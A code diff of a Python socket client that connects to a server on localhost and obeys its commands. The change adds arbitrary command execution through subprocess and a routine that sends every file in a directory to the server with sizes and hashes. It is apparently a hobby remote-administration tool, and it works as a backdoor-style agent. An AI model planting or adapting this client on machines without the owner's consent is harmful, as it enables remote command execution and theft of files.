@@ -1,24 +1,14 @@
 import os
-import shutil
+import subprocess
 import time
+from hashlib import sha256
 from pathlib import Path
 from socket import *
 
 server_name = 'localhost'
 server_port = 34561
 current_path = Path.home()
-
-
-def hostname():
-    print('Hostname requested')
-    host = gethostname()
-    clientSocket.send(host.encode())
-
-
-def user_logged():
-    print('Username requested')
-    username = os.getlogin()
-    clientSocket.send(username.encode())
+slash = '/' if os.name != 'nt' else '\\'
 
 
 def ls():
@@ -39,19 +29,6 @@ def ls():
         break
 
 
-# def cd():
-#     global current_path
-#     print('Change path requested')
-#     path = clientSocket.recv(1024).decode()
-#     try:
-#         os.chdir(path)
-#         current_path = path
-#         clientSocket.send(current_path.encode())
-#     except FileNotFoundError:
-#         print('Path not found')
-#         clientSocket.send('Path not found'.encode())
-
-
 def cdup():
     print('Change to parent directory requested')
     global current_path
@@ -66,21 +43,17 @@ def cdhome():
     clientSocket.send(str(current_path).encode())
 
 
-def cdroot():
-    global current_path
-    print('Change directory to root requested')
-    current_path = Path('C:\\')
-    clientSocket.send(str(current_path).encode())
-
-
-def join():
+def cd():
     global current_path
     print('Join directory requested')
     path = clientSocket.recv(1024).decode()
     try:
-        current_path = str(current_path) + '\\' + path
-        os.chdir(current_path)
-        clientSocket.send(current_path.encode())
+        if os.path.exists(str(current_path) + slash + path):
+            current_path = str(current_path) + slash + path
+            os.chdir(current_path)
+            clientSocket.send(current_path.encode())
+        else:
+            raise FileNotFoundError
     except FileNotFoundError:
         print('Path not found')
         clientSocket.send('Path not found'.encode())
@@ -95,47 +68,78 @@ def get():
     print('Get file requested')
     file_name = clientSocket.recv(1024).decode()
     print('Downloading file ' + file_name)
-    try:
-        file = open(file_name, 'rb')
-        file_data = file.read(1024)
-        clientSocket.send(file_data)
-        while file_data:
-            file_data = file.read(1024)
-            clientSocket.send(file_data)
-        file.close()
-    except FileNotFoundError:
-        print('File not found')
-        clientSocket.send('File not found'.encode())
+    send(file_name)
 
 
 def getall():
-    shutil.make_archive(str(Path.home()) + '\\files', 'zip', current_path)
-    print('Get all files requested')
+    print('Get directory file requested')
+    list_dir = os.walk(current_path)
+    for root, dirs, files in list_dir:
+        for file in files:
+            clientSocket.send(file.encode())
+            send(file)
+            time.sleep(0.1)
+            if clientSocket.recv(1024).decode() == 'ok':
+                continue
+
+        clientSocket.send('.'.encode())
+        break
+
+
+def send(fname):
     try:
-        file = open(str(Path.home()) + '\\files.zip', 'rb')
-        file_data = file.read(1024)
-        clientSocket.send(file_data)
-        while file_data:
-            file_data = file.read(1024)
-            clientSocket.send(file_data)
+        file = open(fname, 'rb')
+        file_size = os.path.getsize(fname)
+        file_hash = sha256(open(fname, 'rb').read()).hexdigest()
+        clientSocket.send(str(file_size).encode())
+        clientSocket.recv(1024).decode()
+        clientSocket.send(str(file_hash).encode())
+        clientSocket.recv(1024).decode()
+        data = file.read()
+        clientSocket.sendall(data)
         file.close()
     except FileNotFoundError:
         print('File not found')
         clientSocket.send('File not found'.encode())
-    os.remove(str(Path.home()) + '\\files.zip')
+
+
+def command():
+    print('Subprocess requested')
+    command = clientSocket.recv(1024).decode()
+    print('Executing command ' + command)
+    try:
+        output = subprocess.check_output(command)
+        if output:
+            clientSocket.send(str(len(output)).encode())
+            clientSocket.sendall(output)
+        else:
+            clientSocket.send('No Output'.encode())
+    except FileNotFoundError:
+        print('Command not found')
+        clientSocket.send('Command not found'.encode())
+
+
+def platform():
+    print('Platform requested')
+    getos = os.name
+    if getos == 'nt':
+        clientSocket.send('Windows'.encode())
+    elif getos == 'posix':
+        clientSocket.send('Linux'.encode())
+    else:
+        clientSocket.send('Unknown'.encode())
 
 
 switcher = {
-    'hostname': hostname,
-    'user': user_logged,
     'ls': ls,
     'pwd': pwd,
     'get': get,
     'getall': getall,
     'cdup': cdup,
     'cdhome': cdhome,
-    'cdroot': cdroot,
-    'join': join}
+    'cd': cd,
+    'command': command,
+    'platform': platform}
 
 connected = False
 while True:
